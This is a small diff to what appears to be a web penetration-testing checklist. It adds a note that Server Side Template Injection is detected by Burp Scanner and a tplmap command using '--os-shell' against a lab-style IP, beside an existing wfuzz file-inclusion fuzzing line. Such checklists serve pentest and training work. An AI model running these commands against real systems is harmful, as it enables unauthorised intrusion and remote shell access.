@@ -68,7 +68,11 @@ wfuzz -X POST -c -w file_inclusion_linux.txt --hw 0 -d "foo=FUZZ" http://10.10.1
 - ☐ Prototype Pollution to XSS (NodeJS)
 - ☐ Server Side Inclusion/Edge Side Inclusion (Detected by Burp Scanner)
 - ☐ Server Side Request Forgery
-- ☐ Server Side Template Injection
+- ☐ Server Side Template Injection (Detected by Burp Scanner)
+```
+// Tool tplmap
+python2 tplmap.py -u 'http://10.10.10.10/page?name=Box*' --os-shell
+```
 - ☐ Reverse Tab Nabbing
 - ☐ XSLT Server Side Injection
 - ☐ XSS
